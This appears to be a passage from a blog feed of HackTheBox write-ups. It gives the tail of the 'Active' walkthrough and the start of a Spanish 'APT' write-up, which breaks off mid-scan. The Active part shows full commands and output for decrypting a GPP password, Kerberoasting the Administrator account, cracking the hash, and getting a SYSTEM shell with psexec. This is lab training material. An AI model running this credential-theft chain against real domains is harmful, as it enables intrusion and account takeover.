&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"utf-8"</span>?&gt;
&lt;Groups <span class="nv">clsid</span><span class="o">=</span><span class="s2">"{3125E937-EB16-4b4c-9934-544FC6D24D26}"</span><span class="o">&gt;</span>&lt;User <span class="nv">clsid</span><span class="o">=</span><span class="s2">"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"active.htb</span><span class="se">\S</span><span class="s2">VC_TGS"</span> <span class="nv">image</span><span class="o">=</span><span class="s2">"2"</span> <span class="nv">changed</span><span class="o">=</span><span class="s2">"2018-07-18 20:46:06"</span> <span class="nv">uid</span><span class="o">=</span><span class="s2">"{EF57DA28-5F69-4530-A59E-AAB58578219D}"</span><span class="o">&gt;</span>&lt;Properties <span class="nv">action</span><span class="o">=</span><span class="s2">"U"</span> <span class="nv">newName</span><span class="o">=</span><span class="s2">""</span> <span class="nv">fullName</span><span class="o">=</span><span class="s2">""</span> <span class="nv">description</span><span class="o">=</span><span class="s2">""</span> <span class="nv">cpassword</span><span class="o">=</span><span class="s2">"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"</span> <span class="nv">changeLogon</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">noChange</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">neverExpires</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">acctDisabled</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">userName</span><span class="o">=</span><span class="s2">"active.htb</span><span class="se">\S</span><span class="s2">VC_TGS"</span>/&gt;&lt;/User&gt;
&lt;/Groups&gt;
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"</code></p>

<ul>
  <li>We can use <code class="language-plaintext highlighter-rouge">ggp-decrypt</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ gpp-decrypt <span class="s1">'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'</span>
GPPstillStandingStrong2k18
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">GPPstillStandingStrong2k18</code></p>

<ul>
  <li>And a user.</li>
</ul>

<p><code class="language-plaintext highlighter-rouge">userName="active.htb\SVC_TGS"</code></p>

<ul>
  <li>Credentials are correct.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.100 <span class="nt">-u</span> <span class="s1">'SVC_TGS'</span> <span class="nt">-p</span> <span class="s1">'GPPstillStandingStrong2k18'</span>
SMB         10.10.10.100    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:active.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.100    445    DC               <span class="o">[</span>+] active.htb<span class="se">\S</span>VC_TGS:GPPstillStandingStrong2k18
</code></pre></div></div>

<ul>
  <li>Now that we have credentials we can view other resources.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.100 <span class="nt">-u</span> <span class="s1">'SVC_TGS'</span> <span class="nt">-p</span> <span class="s1">'GPPstillStandingStrong2k18'</span> <span class="nt">--shares</span>
SMB         10.10.10.100    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:active.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.100    445    DC               <span class="o">[</span>+] active.htb<span class="se">\S</span>VC_TGS:GPPstillStandingStrong2k18 
SMB         10.10.10.100    445    DC               <span class="o">[</span>+] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         10.10.10.100    445    DC               ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         10.10.10.100    445    DC               C<span class="nv">$ </span>                             Default share
SMB         10.10.10.100    445    DC               IPC<span class="nv">$ </span>                           Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.10.100    445    DC               Replication     READ            
SMB         10.10.10.100    445    DC               SYSVOL          READ            Logon server share 
SMB         10.10.10.100    445    DC               Users           READ   
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-u</span> <span class="s1">'SVC_TGS'</span> <span class="nt">-p</span> <span class="s1">'GPPstillStandingStrong2k18'</span> <span class="nt">-r</span> Users
<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	Users                                             	READ ONLY	
	.<span class="se">\U</span>sers<span class="se">\*</span>
	dw--w--w--                0 Sat Jul 21 09:39:20 2018	<span class="nb">.</span>
	dw--w--w--                0 Sat Jul 21 09:39:20 2018	..
	dr--r--r--                0 Mon Jul 16 05:14:21 2018	Administrator
	dr--r--r--                0 Mon Jul 16 16:08:56 2018	All Users
	dw--w--w--                0 Mon Jul 16 16:08:47 2018	Default
	dr--r--r--                0 Mon Jul 16 16:08:56 2018	Default User
	fr--r--r--              174 Mon Jul 16 16:01:17 2018	desktop.ini
	dw--w--w--                0 Mon Jul 16 16:08:47 2018	Public
	dr--r--r--                0 Sat Jul 21 10:16:32 2018	SVC_TGS
</code></pre></div></div>

<ul>
  <li>We can see the <code class="language-plaintext highlighter-rouge">SVC_TGS</code> directory.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-u</span> <span class="s1">'SVC_TGS'</span> <span class="nt">-p</span> <span class="s1">'GPPstillStandingStrong2k18'</span> <span class="nt">-r</span> Users/SVC_TGS
<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	Users                                             	READ ONLY	
	.<span class="se">\U</span>sersSVC_TGS<span class="se">\*</span>
	dr--r--r--                0 Sat Jul 21 10:16:32 2018	<span class="nb">.</span>
	dr--r--r--                0 Sat Jul 21 10:16:32 2018	..
	dr--r--r--                0 Sat Jul 21 10:14:20 2018	Contacts
	dr--r--r--                0 Sat Jul 21 10:14:42 2018	Desktop
	dr--r--r--                0 Sat Jul 21 10:14:28 2018	Downloads
	dr--r--r--                0 Sat Jul 21 10:14:50 2018	Favorites
	dr--r--r--                0 Sat Jul 21 10:15:00 2018	Links
	dr--r--r--                0 Sat Jul 21 10:15:23 2018	My Documents
	dr--r--r--                0 Sat Jul 21 10:15:40 2018	My Music
	dr--r--r--                0 Sat Jul 21 10:15:50 2018	My Pictures
	dr--r--r--                0 Sat Jul 21 10:16:05 2018	My Videos
	dr--r--r--                0 Sat Jul 21 10:16:20 2018	Saved Games
	dr--r--r--                0 Sat Jul 21 10:16:32 2018	Searches
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-u</span> <span class="s1">'SVC_TGS'</span> <span class="nt">-p</span> <span class="s1">'GPPstillStandingStrong2k18'</span> <span class="nt">-r</span> Users/SVC_TGS/Desktop
<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	Users                                             	READ ONLY	
	.<span class="se">\U</span>sersSVC_TGS<span class="se">\D</span>esktop<span class="se">\*</span>
	dr--r--r--                0 Sat Jul 21 10:14:42 2018	<span class="nb">.</span>
	dr--r--r--                0 Sat Jul 21 10:14:42 2018	..
	fw--w--w--               34 Sat Jan 28 17:14:19 2023	user.txt
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<ul>
  <li>Download the <code class="language-plaintext highlighter-rouge">user.txt</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-u</span> <span class="s1">'SVC_TGS'</span> <span class="nt">-p</span> <span class="s1">'GPPstillStandingStrong2k18'</span> <span class="nt">--download</span> Users/SVC_TGS/Desktop/user.txt
<span class="o">[</span>+] Starting download: Users<span class="se">\S</span>VC_TGS<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt <span class="o">(</span>34 bytes<span class="o">)</span>
<span class="o">[</span>+] File output to: /home/miguelrega7/Hackthebox/Active/content/10.10.10.100-Users_SVC_TGS_Desktop_user.txt
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">mv </span>10.10.10.100-Users_SVC_TGS_Desktop_user.txt user.txt
❯ /usr/bin/cat user.txt
b7d2dfba479b6ffa88442b747b15b65d
</code></pre></div></div>

<h2 id="root">Root</h2>

<ul>
  <li>We need more information about the DC.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rpcclient <span class="nt">-U</span> <span class="s2">"SVC_TGS%GPPstillStandingStrong2k18"</span> 10.10.10.100
rpcclient <span class="nv">$&gt;</span> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[SVC_TGS] rid:[0x44f]
rpcclient <span class="nv">$&gt;</span>
</code></pre></div></div>

<ul>
  <li>Groups.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nv">$&gt;</span> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[DnsUpdateProxy] rid:[0x44e]
rpcclient <span class="nv">$&gt;</span> 
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nv">$&gt;</span> querygroupmem 0x200
	rid:[0x1f4] attr:[0x7]
rpcclient <span class="nv">$&gt;</span> queryuser 0x1f4
	User Name   :	Administrator
	Full Name   :	
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	Built-in account <span class="k">for </span>administering the computer/domain
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	sáb, 28 ene 2023 17:14:29 CST
	Logoff Time              :	mié, 31 dic 1969 18:00:00 CST
	Kickoff Time             :	mié, 31 dic 1969 18:00:00 CST
	Password last <span class="nb">set </span>Time   :	mié, 18 jul 2018 14:06:40 CDT
	Password can change Time :	jue, 19 jul 2018 14:06:40 CDT
	Password must change Time:	mié, 13 sep 30828 20:48:05 CST
	unknown_2[0..31]...
	user_rid :	0x1f4
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x0000003f
	padding1[0..7]...
	logon_hrs[0..21]...
rpcclient <span class="nv">$&gt;</span> 

</code></pre></div></div>

<ul>
  <li>More information about the users.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rpcclient <span class="nt">-U</span> <span class="s2">"SVC_TGS%GPPstillStandingStrong2k18"</span> 10.10.10.100
rpcclient <span class="nv">$&gt;</span> querydispinfo
index: 0xdea RID: 0x1f4 acb: 0x00000210 Account: Administrator	Name: <span class="o">(</span>null<span class="o">)</span>	Desc: Built-in account <span class="k">for </span>administering the computer/domain
index: 0xdeb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: <span class="o">(</span>null<span class="o">)</span>	Desc: Built-in account <span class="k">for </span>guest access to the computer/domain
index: 0xe19 RID: 0x1f6 acb: 0x00020011 Account: krbtgt	Name: <span class="o">(</span>null<span class="o">)</span>	Desc: Key Distribution Center Service Account
index: 0xeb2 RID: 0x44f acb: 0x00000210 Account: SVC_TGS	Name: SVC_TGS	Desc: <span class="o">(</span>null<span class="o">)</span>
rpcclient <span class="nv">$&gt;</span>
</code></pre></div></div>

<ul>
  <li>Create a file.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ /bin/cat users.txt
SVC_TGS
</code></pre></div></div>

<h2 id="as-rep-roasting">AS-REP Roasting</h2>

<ul>
  <li>To do this your clock has to be synchronized with the dc clock, if you ever have to do it you can use this command.</li>
</ul>

<p><code class="language-plaintext highlighter-rouge">ntpdate 10.10.10.100</code></p>

<ul>
  <li>
    <p>We could do this if we do not have credentials but since we have the password it was not necessary but if we did not have it we could have requested a ticket but it is not possible.</p>
  </li>
  <li>
    <p>Here you have a link where they explain it very well.</p>
  </li>
  <li>
    <p><a href="https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/">https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/</a></p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ GetNPUsers.py active.htb/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> users.txt
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

<span class="o">[</span>-] User SVC_TGS doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
</span></code></pre></div></div>

<ul>
  <li>
    <p>The port 88 is open so we can use kerbrute as well.</p>
  </li>
  <li>
    <p><a href="https://github.com/ropnop/kerbrute/releases">https://github.com/ropnop/kerbrute/releases</a></p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ./kerbrute_linux_amd64

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/                                        

Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 01/28/23 - Ronnie Flathers @ropnop

This tool is designed to assist <span class="k">in </span>quickly bruteforcing valid Active Directory accounts through Kerberos Pre-Authentication.
It is designed to be used on an internal Windows domain with access to one of the Domain Controllers.
Warning: failed Kerberos Pre-Auth counts as a failed login and WILL lock out accounts

Usage:
  kerbrute <span class="o">[</span><span class="nb">command</span><span class="o">]</span>

Available Commands:
  bruteforce    Bruteforce username:password combos, from a file or stdin
  bruteuser     Bruteforce a single user<span class="s1">'s password from a wordlist
  help          Help about any command
  passwordspray Test a single password against a list of users
  userenum      Enumerate valid domain usernames via Kerberos
  version       Display version info and quit

Flags:
      --dc string       The location of the Domain Controller (KDC) to target. If blank, will lookup via DNS
      --delay int       Delay in millisecond between each attempt. Will always use single thread if set
  -d, --domain string   The full domain to use (e.g. contoso.com)
  -h, --help            help for kerbrute
  -o, --output string   File to write logs to. Optional.
      --safe            Safe mode. Will abort if any user comes back as locked out. Default: FALSE
  -t, --threads int     Threads to use (default 10)
  -v, --verbose         Log failures and errors

Use "kerbrute [command] --help" for more information about a command.
</span></code></pre></div></div>

<ul>
  <li>We can obtain a ticket for the administrator user.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
<span class="nt">--------------------</span>  <span class="nt">-------------</span>  <span class="nt">--------------------------------------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">----------</span>
active/CIFS:445       Administrator  <span class="nv">CN</span><span class="o">=</span>Group Policy Creator Owners,CN<span class="o">=</span>Users,DC<span class="o">=</span>active,DC<span class="o">=</span>htb  2018-07-18 14:06:40.351723  2023-01-28 17:14:29.170938
</code></pre></div></div>

<ul>
  <li>We have the admin user hash, let’s crack it.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 <span class="nt">-request</span>
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
<span class="nt">--------------------</span>  <span class="nt">-------------</span>  <span class="nt">--------------------------------------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">----------</span>
active/CIFS:445       Administrator  <span class="nv">CN</span><span class="o">=</span>Group Policy Creator Owners,CN<span class="o">=</span>Users,DC<span class="o">=</span>active,DC<span class="o">=</span>htb  2018-07-18 14:06:40.351723  2023-01-28 17:14:29.170938             



<span class="o">[</span>-] CCache file is not found. Skipping...
<span class="nv">$krb5tgs$23$*</span>Administrator<span class="nv">$ACTIVE</span>.HTB<span class="nv">$active</span>.htb/Administrator<span class="k">*</span><span class="nv">$4e5088992b25d09403d37d2e9ef6e72a$8c895d03044c58eb7c992d6c70f3ab24ae8c6716a2cdae892b7cbc67ba09818f3f5a04b8f0e37ffd45cc6455b2ac76ac7d50fc53df376ee22d951c44e997ab8ae4f139753e74d224d95c01d3fad9788e0a1a9413ad3782ae99921e681c6400e71a786082ec52549c445f7fbc352f12650a909f01f8d0f9a7e1da875ed9521df6643c80fb2454123e58caf3113ee8cae08b9ee296de7beccb621c3d3905908291faa105879c4f13b9c3e2598e3a4631c25a6d302a6a4b07f6de66d2cfba70cdba9b194889283cde2ee9dae39b9f22c94e07e3aca3f155c37b08278c02a32b75b96cbc3abf08f86a65b22f08c56d17e86faf42ecaf06a17f8f30c34ccdac2fafe6956f852cb07a6aa8297bd34d491b2c94f3180d68d3b0753a69e6a9e3be6f4afd99f6119c4c594456bbe92ca29796ce6b3b5ce23ed6c6718411301dc2feb0ab6f43059cdc09149f22c2ccc183554dc527329a6ecc3fa3024da5b95cbf9df28c6cd02221c99719446f6a78d56a9424eb642221d57df9cea4ddd251a576a1bc352d5ef78a617cd9e26d7fcaec60839a21555be11429568f5e6c1baa5eb8a7ad3cec87d51e0ac3485e8b721377b2f3e12a52e953fb27d4b94b6a5c73452d6ae6b0b5d4d8730114a5aff717f386663eb10d39451097ea081f42595fa0dd1e2aefe2bf08e5884f5615ede70728c6c1bb33fbb39e4bcfba746bf760f16f14ef60162b83c7f835a46fb61b9e73ed119e46ae1753e9c11414d4f20fef2527e2ca6fa95889c1f4d6ff3de678455db626f0dead28d9d0cdf566074e3fd03378283bcb3a0148f997f2f63c53113d700ef7c6d2613d62a16ecd4145aec9eb40a948f1b98c161657b2a114e550e3ee277906f8458d160b2ea3fbdf17eff96b2ca126f7850feaa0885d4f1518a43478ded45b70f40bae58349147681457d22b4cd5aeaaf32632df697914ec300daec74c8d9dbbcc25581c9b2c795598b1a9a34a17a6f8f835413fbd6ca1173935ccd4242c4fa7cf9e90630646cff5ab81cadb0d63259cb471e0e296a96b6461c120efcdfa22e93654cbe537f1b98be8b27c046343263b7335434b8bfb852e8ea1cf760945df81b1701632f8fa2c1da5721cf17e159dd03aa9b55d8a605fb907a341e361280950fa58a1015e4bb5668721cd2259a69dcbd7ab3c0bfcf92cab7a81f85f5bb67125f046ec6bc63d30741cde6792e165ecae26c8eb8ae29ee490b3b0100c98282b6c90ad39ed7783607916c344406667</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5tgs, Kerberos 5 TGS etype 23 <span class="o">[</span>MD4 HMAC-MD5 RC4]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
Ticketmaster1968 <span class="o">(</span>?<span class="o">)</span>
1g 0:00:00:26 DONE <span class="o">(</span>2023-01-28 18:58<span class="o">)</span> 0.03752g/s 395402p/s 395402c/s 395402C/s Tiffani1432..Tiago_18
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed
</code></pre></div></div>

<ul>
  <li>The password is correct.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.100 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-p</span> <span class="s1">'Ticketmaster1968'</span>
SMB         10.10.10.100    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:active.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.100    445    DC               <span class="o">[</span>+] active.htb<span class="se">\A</span>dministrator:Ticketmaster1968 <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Now we can have a shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ./psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100 cmd.exe
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on 10.10.10.100.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file AteihbIx.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on 10.10.10.100.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service nMsa on 10.10.10.100.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service nMsa.....
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
Microsoft Windows <span class="o">[</span>Version 6.1.7601]
Copyright <span class="o">(</span>c<span class="o">)</span> 2009 Microsoft Corporation.  All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">whoami
</span>nt authority<span class="se">\s</span>ystem

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">hostname
</span>DC

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div>

<h2 id="root-flag">Root flag</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">type </span>root.txt
385fab9ee1161ce755cbbffe84ed6701

C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/easy" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - APT (insane)</title><link href="http://localhost:4000/hackthebox/machines/insane/2024/04/14/apt.html" rel="alternate" type="text/html" title="HackTheBox - APT (insane)" /><published>2024-04-14T00:00:00-06:00</published><updated>2024-04-14T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/insane/2024/04/14/apt</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/insane/2024/04/14/apt.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/bbf0ca0388599663e0d8b6955a0760d3.png" />
</p>

<ul>
  <li>En este post vamos a estar haciendo la maquina APT de la plataforma de Hack The Box donde mediante una enumeración por RPC encontramos que se esta empleando IPV6 en la maquina victima a partir de eso conoceremos la dirección IP y comenzaremos a enumerar por smb donde encontraremos un .zip que vamos a crackear, vamos a estar empleando kerbrute para validar usuarios, vamos a leer registros de la maquina, vamos a hacer un bypass al antivirus para poder correr el winpeas y en esta maquina vamos a estar jugando con un hash NTLMv1.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos escaneando los puertos abiertos por el protocolo <strong>TCP</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p80</span>,135 10.129.96.60 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-03-31 19:00 CST
Nmap scan report <span class="k">for </span>10.129.96.60
Host is up <span class="o">(</span>0.092s latency<span class="o">)</span><span class="nb">.</span>

PORT    STATE SERVICE VERSION
80/tcp  open  http    Microsoft IIS httpd 10.0
|_http-title: Gigantic Hosting | Home
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Tenemos el puerto <strong>80</strong> abierto que esta corriendo un servicio <strong>http</strong> eso significa que hay una pagina web.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">➜</span>  <span class="n">nmap</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">96.60</span> <span class="o">-</span><span class="n">v</span>
<span class="no">WhatWeb</span> <span class="n">report</span> <span class="k">for</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">96.60</span>
<span class="no">Status</span>    <span class="p">:</span> <span class="mi">200</span> <span class="no">OK</span>
<span class="no">Title</span>     <span class="p">:</span> <span class="no">Gigantic</span> <span class="no">Hosting</span> <span class="o">|</span> <span class="no">Home</span>
<span class="no">IP</span>        <span class="p">:</span> <span class="mf">10.129</span><span class="o">.</span><span class="mf">96.60</span>
<span class="no">Country</span>   <span class="p">:</span> <span class="no">RESERVED</span><span class="p">,</span> <span class="no">ZZ</span>

<span class="no">Summary</span>   <span class="p">:</span> <span class="no">Bootstrap</span><span class="p">,</span> <span class="no">Email</span><span class="p">[</span><span class="n">sales</span><span class="vi">@gigantichosting</span><span class="p">.</span><span class="nf">com</span><span class="p">],</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">JQuery</span><span class="p">,</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="p">[</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">Script</span><span class="p">[</span><span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">javascript</span><span class="p">,</span><span class="n">text</span><span class="o">/</span><span class="n">javascript</span><span class="p">]</span>

<span class="no">Detected</span> <span class="no">Plugins</span><span class="p">:</span>
<span class="p">[</span> <span class="no">Bootstrap</span> <span class="p">]</span>
	<span class="no">Bootstrap</span> <span class="n">is</span> <span class="n">an</span> <span class="nb">open</span> <span class="n">source</span> <span class="n">toolkit</span> <span class="k">for</span> <span class="n">developing</span> <span class="n">with</span>
	<span class="no">HTML</span><span class="p">,</span> <span class="no">CSS</span><span class="p">,</span> <span class="ow">and</span> <span class="no">JS</span><span class="o">.</span>

	<span class="no">Website</span>     <span class="p">:</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">getbootstrap</span><span class="p">.</span><span class="nf">com</span><span class="o">/</span>

<span class="p">[</span> <span class="no">Email</span> <span class="p">]</span>
	<span class="no">Extract</span> <span class="n">email</span> <span class="n">addresses</span><span class="o">.</span> <span class="no">Find</span> <span class="n">valid</span> <span class="n">email</span> <span class="n">address</span> <span class="ow">and</span>
	<span class="n">syntactically</span> <span class="n">invalid</span> <span class="n">email</span> <span class="n">addresses</span> <span class="n">from</span> <span class="ss">mailto: </span><span class="n">link</span>
	<span class="n">tags</span><span class="o">.</span> <span class="no">We</span> <span class="n">match</span> <span class="n">syntactically</span> <span class="n">invalid</span> <span class="n">links</span> <span class="n">containing</span>
